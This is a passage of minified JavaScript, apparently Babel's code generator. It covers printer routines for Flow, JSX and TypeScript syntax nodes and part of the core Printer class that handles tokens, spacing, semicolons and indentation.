QL1(X){if(X.static)this.word("static"),this.space();if(this._variance(X),this.tokenChar(91),X.id)this.print(X.id),this.tokenChar(58),this.space();this.print(X.key),this.tokenChar(93),this.tokenChar(58),this.space(),this.print(X.value)}function YL1(X){if(X.proto)this.word("proto"),this.space();if(X.static)this.word("static"),this.space();if(X.kind==="get"||X.kind==="set")this.word(X.kind),this.space();if(this._variance(X),this.print(X.key),X.optional)this.tokenChar(63);if(!X.method)this.tokenChar(58),this.space();this.print(X.value)}function WL1(X){this.token("..."),this.print(X.argument)}function GL1(X){this.print(X.qualification),this.tokenChar(46),this.print(X.id)}function zL1(){this.word("symbol")}function HL1(X){this.space(),this.token("|",!1,X),this.space()}function UL1(X){this.printJoin(X.types,void 0,void 0,HL1)}function KL1(X){this.tokenChar(40),this.print(X.expression),this.print(X.typeAnnotation),this.tokenChar(41)}function VL1(X){if(X.kind==="plus")this.tokenChar(43);else this.tokenChar(45)}function BL1(){this.word("void")}function qL1(X){this.print(X.objectType,!0),this.tokenChar(91),this.print(X.indexType),this.tokenChar(93)}function ZL1(X){if(this.print(X.objectType),X.optional)this.token("?.");this.tokenChar(91),this.print(X.indexType),this.tokenChar(93)}});var $j=c((Ej)=>{Object.defineProperty(Ej,"__esModule",{value:!0});Ej.BlockStatement=ID1;Ej.Directive=CD1;Ej.DirectiveLiteral=TD1;Ej.File=DD1;Ej.InterpreterDirective=_D1;Ej.Placeholder=ED1;Ej.Program=wD1;function DD1(X){if(X.program)this.print(X.program.interpreter);this.print(X.program)}function wD1(X){var J;this.noIndentInnerCommentsHere(),this.printInnerComments();let Q=(J=X.directives)==null?void 0:J.length;if(Q){var Y;let W=X.body.length?2:1;if(this.printSequence(X.directives,void 0,W),!((Y=X.directives[Q-1].trailingComments)!=null&&Y.length))this.newline(W)}this.printSequence(X.body)}function ID1(X){var J;this.tokenChar(123);let Q=this.enterDelimited(),Y=(J=X.directives)==null?void 0:J.length;if(Y){var W;let z=X.body.length?2:1;if(this.printSequence(X.directives,!0,z),!((W=X.directives[Y-1].trailingComments)!=null&&W.length))this.newline(z)}this.printSequence(X.body,!0),Q(),this.rightBrace(X)}function CD1(X){this.print(X.value),this.semicolon()}var PD1=/(?:^|[^\\])(?:\\\\)*'/,SD1=/(?:^|[^\\])(?:\\\\)*"/;function TD1(X){let J=this.getPossibleRaw(X);if(!this.format.minified&&J!==void 0){this.token(J);return}let{value:Q}=X;if(!SD1.test(Q))this.token(`"${Q}"`);else if(!PD1.test(Q))this.token(`'${Q}'`);else throw new Error("Malformed AST: it is not possible to print a directive containing both unescaped single and double quotes.")}function _D1(X){this.token(`#!${X.value}`),this.newline(1,!0)}function ED1(X){if(this.token("%%"),this.print(X.name),this.token("%%"),X.expectedNode==="Statement")this.semicolon()}});var bj=c((kj)=>{Object.defineProperty(kj,"__esModule",{value:!0});kj.JSXAttribute=hD1;kj.JSXClosingElement=aD1;kj.JSXClosingFragment=eD1;kj.JSXElement=iD1;kj.JSXEmptyExpression=sD1;kj.JSXExpressionContainer=lD1;kj.JSXFragment=oD1;kj.JSXIdentifier=yD1;kj.JSXMemberExpression=uD1;kj.JSXNamespacedName=mD1;kj.JSXOpeningElement=nD1;kj.JSXOpeningFragment=tD1;kj.JSXSpreadAttribute=cD1;kj.JSXSpreadChild=pD1;kj.JSXText=dD1;function hD1(X){if(this.print(X.name),X.value)this.tokenChar(61),this.print(X.value)}function yD1(X){this.word(X.name)}function mD1(X){this.print(X.namespace),this.tokenChar(58),this.print(X.name)}function uD1(X){this.print(X.object),this.tokenChar(46),this.print(X.property)}function cD1(X){this.tokenChar(123),this.token("..."),this.print(X.argument),this.rightBrace(X)}function lD1(X){this.tokenChar(123),this.print(X.expression),this.rightBrace(X)}function pD1(X){this.tokenChar(123),this.token("..."),this.print(X.expression),this.rightBrace(X)}function dD1(X){let J=this.getPossibleRaw(X);if(J!==void 0)this.token(J,!0);else this.token(X.value,!0)}function iD1(X){let J=X.openingElement;if(this.print(J),J.selfClosing)return;this.indent();for(let Q of X.children)this.print(Q);this.dedent(),this.print(X.closingElement)}function rD1(){this.space()}function nD1(X){this.tokenChar(60),this.print(X.name);{if(X.typeArguments)this.print(X.typeArguments);this.print(X.typeParameters)}if(X.attributes.length>0)this.space(),this.printJoin(X.attributes,void 0,void 0,rD1);if(X.selfClosing)this.space(),this.tokenChar(47);this.tokenChar(62)}function aD1(X){this.tokenChar(60),this.tokenChar(47),this.print(X.name),this.tokenChar(62)}function sD1(){this.printInnerComments()}function oD1(X){this.print(X.openingFragment),this.indent();for(let J of X.children)this.print(J);this.dedent(),this.print(X.closingFragment)}function tD1(){this.tokenChar(60),this.tokenChar(62)}function eD1(){this.token("</"),this.tokenChar(62)}});var yj=c((hj)=>{Object.defineProperty(hj,"__esModule",{value:!0});hj.TSAnyKeyword=Tw1;hj.TSArrayType=aw1;hj.TSSatisfiesExpression=hj.TSAsExpression=MI1;hj.TSBigIntKeyword=_w1;hj.TSBooleanKeyword=bw1;hj.TSCallSignatureDeclaration=Dw1;hj.TSInterfaceHeritage=hj.TSClassImplements=VI1;hj.TSConditionalType=QI1;hj.TSConstructSignatureDeclaration=ww1;hj.TSConstructorType=lw1;hj.TSDeclareFunction=Aw1;hj.TSDeclareMethod=Nw1;hj.TSEnumBody=gj;hj.TSEnumDeclaration=OI1;hj.TSEnumMember=RI1;hj.TSExportAssignment=CI1;hj.TSExternalModuleReference=wI1;hj.TSFunctionType=cw1;hj.TSImportEqualsDeclaration=DI1;hj.TSImportType=LI1;hj.TSIndexSignature=Sw1;hj.TSIndexedAccessType=zI1;hj.TSInferType=YI1;hj.TSInstantiationExpression=jI1;hj.TSInterfaceBody=qI1;hj.TSInterfaceDeclaration=BI1;hj.TSIntersectionType=JI1;hj.TSIntrinsicKeyword=mw1;hj.TSLiteralType=KI1;hj.TSMappedType=HI1;hj.TSMethodSignature=Pw1;hj.TSModuleBlock=NI1;hj.TSModuleDeclaration=AI1;hj.TSNamedTupleMember=ew1;hj.TSNamespaceExportDeclaration=PI1;hj.TSNeverKeyword=yw1;hj.TSNonNullExpression=II1;hj.TSNullKeyword=hw1;hj.TSNumberKeyword=$w1;hj.TSObjectKeyword=kw1;hj.TSOptionalType=ow1;hj.TSParameterProperty=Rw1;hj.TSParenthesizedType=WI1;hj.TSPropertySignature=Iw1;hj.TSQualifiedName=Lw1;hj.TSRestType=tw1;hj.TSStringKeyword=vw1;hj.TSSymbolKeyword=xw1;hj.TSTemplateLiteralType=UI1;hj.TSThisType=uw1;hj.TSTupleType=sw1;hj.TSTypeAliasDeclaration=ZI1;hj.TSTypeAnnotation=Fw1;hj.TSTypeAssertion=FI1;hj.TSTypeLiteral=nw1;hj.TSTypeOperator=GI1;hj.TSTypeParameter=Ow1;hj.TSTypeParameterDeclaration=hj.TSTypeParameterInstantiation=jw1;hj.TSTypePredicate=iw1;hj.TSTypeQuery=rw1;hj.TSTypeReference=dw1;hj.TSUndefinedKeyword=gw1;hj.TSUnionType=XI1;hj.TSUnknownKeyword=Ew1;hj.TSVoidKeyword=fw1;hj.tsPrintClassMemberModifiers=TI1;hj.tsPrintFunctionOrConstructorType=pw1;hj.tsPrintPropertyOrMethodName=Cw1;hj.tsPrintSignatureDeclarationBase=SI1;function Fw1(X,J){if(this.token((J.type==="TSFunctionType"||J.type==="TSConstructorType")&&J.typeAnnotation===X?"=>":":"),this.space(),X.optional)this.tokenChar(63);this.print(X.typeAnnotation)}function jw1(X,J){this.tokenChar(60);let Q=J.type==="ArrowFunctionExpression"&&X.params.length===1;if(this.tokenMap&&X.start!=null&&X.end!=null)Q&&(Q=!!this.tokenMap.find(X,(Y)=>this.tokenMap.matchesOriginal(Y,","))),Q||(Q=this.shouldPrintTrailingComma(">"));this.printList(X.params,Q),this.tokenChar(62)}function Ow1(X){if(X.const)this.word("const"),this.space();if(X.in)this.word("in"),this.space();if(X.out)this.word("out"),this.space();if(this.word(X.name),X.constraint)this.space(),this.word("extends"),this.space(),this.print(X.constraint);if(X.default)this.space(),this.tokenChar(61),this.space(),this.print(X.default)}function Rw1(X){if(X.accessibility)this.word(X.accessibility),this.space();if(X.readonly)this.word("readonly"),this.space();this._param(X.parameter)}function Aw1(X,J){if(X.declare)this.word("declare"),this.space();this._functionHead(X,J),this.semicolon()}function Nw1(X){this._classMethodHead(X),this.semicolon()}function Lw1(X){this.print(X.left),this.tokenChar(46),this.print(X.right)}function Dw1(X){this.tsPrintSignatureDeclarationBase(X),p5(this,X)}function p5(X,J){if(!X.tokenMap||!J.start||!J.end){X.semicolon();return}if(X.tokenMap.endMatches(J,","))X.token(",");else if(X.tokenMap.endMatches(J,";"))X.semicolon()}function ww1(X){this.word("new"),this.space(),this.tsPrintSignatureDeclarationBase(X),p5(this,X)}function Iw1(X){let{readonly:J}=X;if(J)this.word("readonly"),this.space();this.tsPrintPropertyOrMethodName(X),this.print(X.typeAnnotation),p5(this,X)}function Cw1(X){if(X.computed)this.tokenChar(91);if(this.print(X.key),X.computed)this.tokenChar(93);if(X.optional)this.tokenChar(63)}function Pw1(X){let{kind:J}=X;if(J==="set"||J==="get")this.word(J),this.space();this.tsPrintPropertyOrMethodName(X),this.tsPrintSignatureDeclarationBase(X),p5(this,X)}function Sw1(X){let{readonly:J,static:Q}=X;if(Q)this.word("static"),this.space();if(J)this.word("readonly"),this.space();this.tokenChar(91),this._parameters(X.parameters,"]"),this.print(X.typeAnnotation),p5(this,X)}function Tw1(){this.word("any")}function _w1(){this.word("bigint")}function Ew1(){this.word("unknown")}function $w1(){this.word("number")}function kw1(){this.word("object")}function bw1(){this.word("boolean")}function vw1(){this.word("string")}function xw1(){this.word("symbol")}function fw1(){this.word("void")}function gw1(){this.word("undefined")}function hw1(){this.word("null")}function yw1(){this.word("never")}function mw1(){this.word("intrinsic")}function uw1(){this.word("this")}function cw1(X){this.tsPrintFunctionOrConstructorType(X)}function lw1(X){if(X.abstract)this.word("abstract"),this.space();this.word("new"),this.space(),this.tsPrintFunctionOrConstructorType(X)}function pw1(X){let{typeParameters:J}=X,Q=X.parameters;this.print(J),this.tokenChar(40),this._parameters(Q,")"),this.space();let Y=X.typeAnnotation;this.print(Y)}function dw1(X){let J=X.typeParameters;this.print(X.typeName,!!J),this.print(J)}function iw1(X){if(X.asserts)this.word("asserts"),this.space();if(this.print(X.parameterName),X.typeAnnotation)this.space(),this.word("is"),this.space(),this.print(X.typeAnnotation.typeAnnotation)}function rw1(X){this.word("typeof"),this.space(),this.print(X.exprName);let J=X.typeParameters;if(J)this.print(J)}function nw1(X){p4(this,X,()=>this.printJoin(X.members,!0,!0))}function aw1(X){this.print(X.elementType,!0),this.tokenChar(91),this.tokenChar(93)}function sw1(X){this.tokenChar(91),this.printList(X.elementTypes,this.shouldPrintTrailingComma("]")),this.tokenChar(93)}function ow1(X){this.print(X.typeAnnotation),this.tokenChar(63)}function tw1(X){this.token("..."),this.print(X.typeAnnotation)}function ew1(X){if(this.print(X.label),X.optional)this.tokenChar(63);this.tokenChar(58),this.space(),this.print(X.elementType)}function XI1(X){fj(this,X,"|")}function JI1(X){fj(this,X,"&")}function fj(X,J,Q){var Y;let W=0;if((Y=X.tokenMap)!=null&&Y.startMatches(J,Q))W=1,X.token(Q);X.printJoin(J.types,void 0,void 0,function(z){this.space(),this.token(Q,null,z+W),this.space()})}function QI1(X){this.print(X.checkType),this.space(),this.word("extends"),this.space(),this.print(X.extendsType),this.space(),this.tokenChar(63),this.space(),this.print(X.trueType),this.space(),this.tokenChar(58),this.space(),this.print(X.falseType)}function YI1(X){this.word("infer"),this.print(X.typeParameter)}function WI1(X){this.tokenChar(40),this.print(X.typeAnnotation),this.tokenChar(41)}function GI1(X){this.word(X.operator),this.space(),this.print(X.typeAnnotation)}function zI1(X){this.print(X.objectType,!0),this.tokenChar(91),this.print(X.indexType),this.tokenChar(93)}function HI1(X){let{nameType:J,optional:Q,readonly:Y,typeAnnotation:W}=X;this.tokenChar(123);let z=this.enterDelimited();if(this.space(),Y)vj(this,Y),this.word("readonly"),this.space();if(this.tokenChar(91),this.word(X.typeParameter.name),this.space(),this.word("in"),this.space(),this.print(X.typeParameter.constraint),J)this.space(),this.word("as"),this.space(),this.print(J);if(this.tokenChar(93),Q)vj(this,Q),this.tokenChar(63);if(W)this.tokenChar(58),this.space(),this.print(W);this.space(),z(),this.tokenChar(125)}function vj(X,J){if(J!==!0)X.token(J)}function UI1(X){this._printTemplate(X,X.types)}function KI1(X){this.print(X.literal)}function VI1(X){this.print(X.expression),this.print(X.typeArguments)}function BI1(X){let{declare:J,id:Q,typeParameters:Y,extends:W,body:z}=X;if(J)this.word("declare"),this.space();if(this.word("interface"),this.space(),this.print(Q),this.print(Y),W!=null&&W.length)this.space(),this.word("extends"),this.space(),this.printList(W);this.space(),this.print(z)}function qI1(X){p4(this,X,()=>this.printJoin(X.body,!0,!0))}function ZI1(X){let{declare:J,id:Q,typeParameters:Y,typeAnnotation:W}=X;if(J)this.word("declare"),this.space();this.word("type"),this.space(),this.print(Q),this.print(Y),this.space(),this.tokenChar(61),this.space(),this.print(W),this.semicolon()}function MI1(X){let{type:J,expression:Q,typeAnnotation:Y}=X;this.print(Q,!0),this.space(),this.word(J==="TSAsExpression"?"as":"satisfies"),this.space(),this.print(Y)}function FI1(X){let{typeAnnotation:J,expression:Q}=X;this.tokenChar(60),this.print(J),this.tokenChar(62),this.space(),this.print(Q)}function jI1(X){this.print(X.expression),this.print(X.typeParameters)}function OI1(X){let{declare:J,const:Q,id:Y}=X;if(J)this.word("declare"),this.space();if(Q)this.word("const"),this.space();this.word("enum"),this.space(),this.print(Y),this.space(),gj.call(this,X)}function gj(X){p4(this,X,()=>{var J;return this.printList(X.members,(J=this.shouldPrintTrailingComma("}"))!=null?J:!0,!0,!0)})}function RI1(X){let{id:J,initializer:Q}=X;if(this.print(J),Q)this.space(),this.tokenChar(61),this.space(),this.print(Q)}function AI1(X){let{declare:J,id:Q,kind:Y}=X;if(J)this.word("declare"),this.space();{if(!X.global)this.word(Y!=null?Y:Q.type==="Identifier"?"namespace":"module"),this.space();if(this.print(Q),!X.body){this.semicolon();return}let W=X.body;while(W.type==="TSModuleDeclaration")this.tokenChar(46),this.print(W.id),W=W.body;this.space(),this.print(W)}}function NI1(X){p4(this,X,()=>this.printSequence(X.body,!0))}function LI1(X){let{argument:J,qualifier:Q,options:Y}=X;if(this.word("import"),this.tokenChar(40),this.print(J),Y)this.tokenChar(44),this.print(Y);if(this.tokenChar(41),Q)this.tokenChar(46),this.print(Q);let W=X.typeParameters;if(W)this.print(W)}function DI1(X){let{id:J,moduleReference:Q}=X;if(X.isExport)this.word("export"),this.space();this.word("import"),this.space(),this.print(J),this.space(),this.tokenChar(61),this.space(),this.print(Q),this.semicolon()}function wI1(X){this.token("require("),this.print(X.expression),this.tokenChar(41)}function II1(X){this.print(X.expression),this.tokenChar(33)}function CI1(X){this.word("export"),this.space(),this.tokenChar(61),this.space(),this.print(X.expression),this.semicolon()}function PI1(X){this.word("export"),this.space(),this.word("as"),this.space(),this.word("namespace"),this.space(),this.print(X.id),this.semicolon()}function SI1(X){let{typeParameters:J}=X,Q=X.parameters;this.print(J),this.tokenChar(40),this._parameters(Q,")");let Y=X.typeAnnotation;this.print(Y)}function TI1(X){let J=X.type==="ClassPrivateProperty",Q=X.type==="ClassAccessorProperty"||X.type==="ClassProperty";if(xj(this,X,[Q&&X.declare&&"declare",!J&&X.accessibility]),X.static)this.word("static"),this.space();xj(this,X,[!J&&X.abstract&&"abstract",!J&&X.override&&"override",(Q||J)&&X.readonly&&"readonly"])}function p4(X,J,Q){X.token("{");let Y=X.enterDelimited();Q(),Y(),X.rightBrace(J)}function xj(X,J,Q){var Y;let W=new Set;for(let z of Q)if(z)W.add(z);(Y=X.tokenMap)==null||Y.find(J,(z)=>{if(W.has(z.value))return X.token(z.value),X.space(),W.delete(z.value),W.size===0});for(let z of W)X.word(z),X.space()}});var mj=c((R0)=>{Object.defineProperty(R0,"__esModule",{value:!0});var mG=Qj();Object.keys(mG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===mG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return mG[X]}})});var uG=Gj();Object.keys(uG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===uG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return uG[X]}})});var cG=Bj();Object.keys(cG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===cG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return cG[X]}})});var lG=Zj();Object.keys(lG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===lG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return lG[X]}})});var pG=Fj();Object.keys(pG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===pG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return pG[X]}})});var dG=xG();Object.keys(dG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===dG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return dG[X]}})});var iG=hG();Object.keys(iG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===iG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return iG[X]}})});var rG=_j();Object.keys(rG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===rG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return rG[X]}})});var nG=$j();Object.keys(nG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===nG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return nG[X]}})});var aG=bj();Object.keys(aG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===aG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return aG[X]}})});var sG=yj();Object.keys(sG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in R0&&R0[X]===sG[X])return;Object.defineProperty(R0,X,{enumerable:!0,get:function(){return sG[X]}})})});var cj=c((uj)=>{Object.defineProperty(uj,"__esModule",{value:!0});uj.addDeprecatedGenerators=pC1;function pC1(X){{let J={Noop(){},TSExpressionWithTypeArguments(Q){this.print(Q.expression),this.print(Q.typeParameters)},DecimalLiteral(Q){let Y=this.getPossibleRaw(Q);if(!this.format.minified&&Y!==void 0){this.word(Y);return}this.word(Q.value+"m")}};Object.assign(X.prototype,J)}}});var nj=c((ij)=>{Object.defineProperty(ij,"__esModule",{value:!0});ij.default=void 0;var iC1=_F(),R9=yX(),pj=R9,rC1=U0(),nC1=Xj(),aC1=mj(),sC1=cj(),{isExpression:oC1,isFunction:tC1,isStatement:eC1,isClassBody:XP1,isTSInterfaceBody:JP1,isTSEnumMember:QP1}=rC1,YP1=/e/i,WP1=/\.0+$/,dj=/[\n\r\u2028\u2029]/,GP1=/[\n\r\u2028\u2029]|\*\//;function lj(X){return X.type==="CommentLine"||dj.test(X.value)}var{needsParens:zP1}=pj;class d4{constructor(X,J,Q,Y){this.tokenContext=R9.TokenContext.normal,this._tokens=null,this._originalCode=null,this._currentNode=null,this._indent=0,this._indentRepeat=0,this._insideAux=!1,this._noLineTerminator=!1,this._noLineTerminatorAfterNode=null,this._printAuxAfterOnNextUserNode=!1,this._printedComments=new Set,this._endsWithInteger=!1,this._endsWithWord=!1,this._endsWithDiv=!1,this._lastCommentLine=0,this._endsWithInnerRaw=!1,this._indentInnerComments=!0,this.tokenMap=null,this._boundGetRawIdentifier=this._getRawIdentifier.bind(this),this._printSemicolonBeforeNextNode=-1,this._printSemicolonBeforeNextToken=-1,this.format=X,this._tokens=Q,this._originalCode=Y,this._indentRepeat=X.indent.style.length,this._inputMap=J==null?void 0:J._inputMap,this._buf=new iC1.default(J,X.indent.style[0])}enterForStatementInit(){return this.tokenContext|=R9.TokenContext.forInitHead|R9.TokenContext.forInOrInitHeadAccumulate,()=>this.tokenContext=R9.TokenContext.normal}enterForXStatementInit(X){if(X)return this.tokenContext|=R9.TokenContext.forOfHead,null;else return this.tokenContext|=R9.TokenContext.forInHead|R9.TokenContext.forInOrInitHeadAccumulate,()=>this.tokenContext=R9.TokenContext.normal}enterDelimited(){let X=this.tokenContext,J=this._noLineTerminatorAfterNode;if(!(X&R9.TokenContext.forInOrInitHeadAccumulate)&&J===null)return()=>{};return this._noLineTerminatorAfterNode=null,this.tokenContext=R9.TokenContext.normal,()=>{this._noLineTerminatorAfterNode=J,this.tokenContext=X}}generate(X){if(this.format.preserveFormat)this.tokenMap=new nC1.TokenMap(X,this._tokens,this._originalCode);return this.print(X),this._maybeAddAuxComment(),this._buf.get()}indent(){let{format:X}=this;if(X.preserveFormat||X.compact||X.concise)return;this._indent++}dedent(){let{format:X}=this;if(X.preserveFormat||X.compact||X.concise)return;this._indent--}semicolon(X=!1){if(this._maybeAddAuxComment(),X){this._appendChar(59),this._noLineTerminator=!1;return}if(this.tokenMap){let J=this._currentNode;if(J.start!=null&&J.end!=null){if(!this.tokenMap.endMatches(J,";")){this._printSemicolonBeforeNextNode=this._buf.getCurrentLine();return}let Q=this.tokenMap.getIndexes(this._currentNode);this._catchUpTo(this._tokens[Q[Q.length-1]].loc.start)}}this._queue(59),this._noLineTerminator=!1}rightBrace(X){if(this.format.minified)this._buf.removeLastSemicolon();this.sourceWithOffset("end",X.loc,-1),this.tokenChar(125)}rightParens(X){this.sourceWithOffset("end",X.loc,-1),this.tokenChar(41)}space(X=!1){let{format:J}=this;if(J.compact||J.preserveFormat)return;if(X)this._space();else if(this._buf.hasContent()){let Q=this.getLastChar();if(Q!==32&&Q!==10)this._space()}}word(X,J=!1){if(this.tokenContext&=R9.TokenContext.forInOrInitHeadAccumulatePassThroughMask,this._maybePrintInnerComments(X),this._maybeAddAuxComment(),this.tokenMap)this._catchUpToCurrentToken(X);if(this._endsWithWord||this._endsWithDiv&&X.charCodeAt(0)===47)this._space();this._append(X,!1),this._endsWithWord=!0,this._noLineTerminator=J}number(X,J){function Q(Y){if(Y.length>2&&Y.charCodeAt(0)===48){let W=Y.charCodeAt(1);return W===98||W===111||W===120}return!1}this.word(X),this._endsWithInteger=Number.isInteger(J)&&!Q(X)&&!YP1.test(X)&&!WP1.test(X)&&X.charCodeAt(X.length-1)!==46}token(X,J=!1,Q=0){if(this.tokenContext&=R9.TokenContext.forInOrInitHeadAccumulatePassThroughMask,this._maybePrintInnerComments(X,Q),this._maybeAddAuxComment(),this.tokenMap)this._catchUpToCurrentToken(X,Q);let Y=this.getLastChar(),W=X.charCodeAt(0);if(Y===33&&(X==="--"||W===61)||W===43&&Y===43||W===45&&Y===45||W===46&&this._endsWithInteger)this._space();this._append(X,J),this._noLineTerminator=!1}tokenChar(X){this.tokenContext&=R9.TokenContext.forInOrInitHeadAccumulatePassThroughMask;let J=String.fromCharCode(X);if(this._maybePrintInnerComments(J),this._maybeAddAuxComment(),this.tokenMap)this._catchUpToCurrentToken(J);let Q=this.getLastChar();if(X===43&&Q===43||X===45&&Q===45||X===46&&this._endsWithInteger)this._space();this._appendChar(X),this._noLineTerminator=!1}newline(X=1,J){if(X<=0)return;if(!J){if(this.format.retainLines||this.format.compact)return;if(this.format.concise){this.space();return}}if(X>2)X=2;X-=this._buf.getNewlineCount();for(let Q=0;Q<X;Q++)this._newline();return}endsWith(X){return this.getLastChar()===X}getLastChar(){return this._buf.getLastChar()}endsWithCharAndNewline(){return this._buf.endsWithCharAndNewline()}removeTrailingNewline(){this._buf.removeTrailingNewline()}exactSource(X,J){if(!X){J();return}this._catchUp("start",X),this._buf.exactSource(X,J)}source(X,J){if(!J)return;this._catchUp(X,J),this._buf.source(X,J)}sourceWithOffset(X,J,Q){if(!J||this.format.preserveFormat)return;this._catchUp(X,J),this._buf.sourceWithOffset(X,J,Q)}sourceIdentifierName(X,J){if(!this._buf._canMarkIdName)return;let Q=this._buf._sourcePosition;Q.identifierNamePos=J,Q.identifierName=X}_space(){this._queue(32)}_newline(){this._queue(10)}_catchUpToCurrentToken(X,J=0){let Q=this.tokenMap.findMatching(this._currentNode,X,J);if(Q)this._catchUpTo(Q.loc.start);if(this._printSemicolonBeforeNextToken!==-1&&this._printSemicolonBeforeNextToken===this._buf.getCurrentLine())this._buf.appendChar(59),this._endsWithWord=!1,this._endsWithInteger=!1,this._endsWithDiv=!1;this._printSemicolonBeforeNextToken=-1,this._printSemicolonBeforeNextNode=-1}_append(X,J){this._maybeIndent(X.charCodeAt(0)),this._buf.append(X,J),this._endsWithWord=!1,this._endsWithInteger=!1,this._endsWithDiv=!1}_appendChar(X){this._maybeIndent(X),this._buf.appendChar(X),this._endsWithWord=!1,this._endsWithInteger=!1,this._endsWithDiv=!1}_queue(X){this._maybeIndent(X),this._buf.queue(X),this._endsWithWord=!1,this._endsWithInteger=!1}_maybeIndent(X){if(this._indent&&X!==10&&this.endsWith(10))this._buf.queueIndentation(this._getIndent())}_shouldIndent(X){if(this._indent&&X!==10&&this.endsWith(10))return!0}catchUp(X){if(!this.format.retainLines)return;let J=X-this._buf.getCurrentLine();for(let Q=0;Q<J;Q++)this._newline()}_catchUp(X,J){let{format:Q}=this;if(!Q.preserveFormat){if(Q.retainLines&&J!=null&&J[X])this.catchUp(J[X].line);return}let Y=J==null?void 0:J[X];if(Y!=null)this._catchUpTo(Y)}_catchUpTo({line:X,column:J,index:Q}){let Y=X-this._buf.getCurrentLine();if(Y>0&&this._noLineTerminator)return;for(let z=0;z<Y;z++)this._newline();let W=Y>0?J:J-this._buf.getCurrentColumn();if(W>0){let z=this._originalCode?this._originalCode.slice(Q-W,Q).replace(/[^\t\x0B\f \xA0\u1680\u2000-\u200A\u202F\u205F\u3000\uFEFF]/gu," "):" ".repeat(W);this._append(z,!1)}}_getIndent(){return this._indentRepeat*this._indent}printTerminatorless(X){this._noLineTerminator=!0,this.print(X)}print(X,J,Q){var Y,W,z;if(!X)return;this._endsWithInnerRaw=!1;let G=X.type,H=this.format,U=H.concise;if(X._compact)H.concise=!0;let K=this[G];if(K===void 0)throw new ReferenceError(`unknown node of type ${JSON.stringify(G)} with constructor ${JSON.stringify(X.constructor.name)}`);let V=this._currentNode;if(this._currentNode=X,this.tokenMap)this._printSemicolonBeforeNextToken=this._printSemicolonBeforeNextNode;let B=this._insideAux;this._insideAux=X.loc==null,this._maybeAddAuxComment(this._insideAux&&!B);let Z=(Y=X.extra)==null?void 0:Y.parenthesized,M=Z&&H.preserveFormat||Z&&H.retainFunctionParens&&G==="FunctionExpression"||zP1(X,V,this.tokenContext,H.preserveFormat?this._boundGetRawIdentifier:void 0);if(!M&&Z&&(W=X.leadingComments)!=null&&W.length&&X.leadingComments[0].type==="CommentBlock")switch(V==null?void 0:V.type){case"ExpressionStatement":case"VariableDeclarator":case"AssignmentExpression":case"ReturnStatement":break;case"CallExpression":case"OptionalCallExpression":case"NewExpression":if(V.callee!==X)break;default:M=!0}let F=!1;if(!M&&this._noLineTerminator&&((z=X.leadingComments)!=null&&z.some(lj)||this.format.retainLines&&X.loc&&X.loc.start.line>this._buf.getCurrentLine()))M=!0,F=!0;let j,O;if(!M){if(J||(J=V&&this._noLineTerminatorAfterNode===V&&pj.isLastChild(V,X)),J){var N;if((N=X.trailingComments)!=null&&N.some(lj)){if(oC1(X))M=!0}else j=this._noLineTerminatorAfterNode,this._noLineTerminatorAfterNode=X}}if(M){if(this.tokenChar(40),F)this.indent();if(this._endsWithInnerRaw=!1,this.tokenContext&R9.TokenContext.forInOrInitHeadAccumulate)O=this.tokenContext,this.tokenContext=R9.TokenContext.normal;j=this._noLineTerminatorAfterNode,this._noLineTerminatorAfterNode=null}this._lastCommentLine=0,this._printLeadingComments(X,V);let A=G==="Program"||G==="File"?null:X.loc;if(this.exactSource(A,K.bind(this,X,V)),M){if(this._printTrailingComments(X,V),F)this.dedent(),this.newline();if(this.tokenChar(41),this._noLineTerminator=J,O)this.tokenContext=O}else if(J&&!this._noLineTerminator)this._noLineTerminator=!0,this._printTrailingComments(X,V);else this._printTrailingComments(X,V,Q);if(this._currentNode=V,H.concise=U,this._insideAux=B,j!==void 0)this._noLineTerminatorAfterNode=j;this._endsWithInnerRaw=!1}_maybeAddAuxComment(X){if(X)this._printAuxBeforeComment();if(!this._insideAux)this._printAuxAfterComment()}_printAuxBeforeComment(){if(this._printAuxAfterOnNextUserNode)return;this._printAuxAfterOnNextUserNode=!0;let X=this.format.auxiliaryCommentBefore;if(X)this._printComment({type:"CommentBlock",value:X},0)}_printAuxAfterComment(){if(!this._printAuxAfterOnNextUserNode)return;this._printAuxAfterOnNextUserNode=!1;let X=this.format.auxiliaryCommentAfter;if(X)this._printComment({type:"CommentBlock",value:X},0)}getPossibleRaw(X){let J=X.extra;if((J==null?void 0:J.raw)!=null&&J.rawValue!=null&&X.value===J.rawValue)return J.raw}printJoin(X,J,Q,Y,W,z,G,H){if(!(X!=null&&X.length))return;if(Q==null&&this.format.retainLines){var U;let F=(U=X[0].loc)==null?void 0:U.start.line;if(F!=null&&F!==this._buf.getCurrentLine())Q=!0}if(Q)this.indent();let K={addNewlines:z,nextNodeStartLine:0},V=Y==null?void 0:Y.bind(this),B=X.length;for(let F=0;F<B;F++){let j=X[F];if(!j)continue;if(J)this._printNewline(F===0,K);if(this.print(j,void 0,H||0),G==null||G(j,F),V!=null){if(F<B-1)V(F,!1);else if(W)V(F,!0)}if(J){var Z;if(!((Z=j.trailingComments)!=null&&Z.length))this._lastCommentLine=0;if(F+1===B)this.newline(1);else{var M;let O=X[F+1];K.nextNodeStartLine=((M=O.loc)==null?void 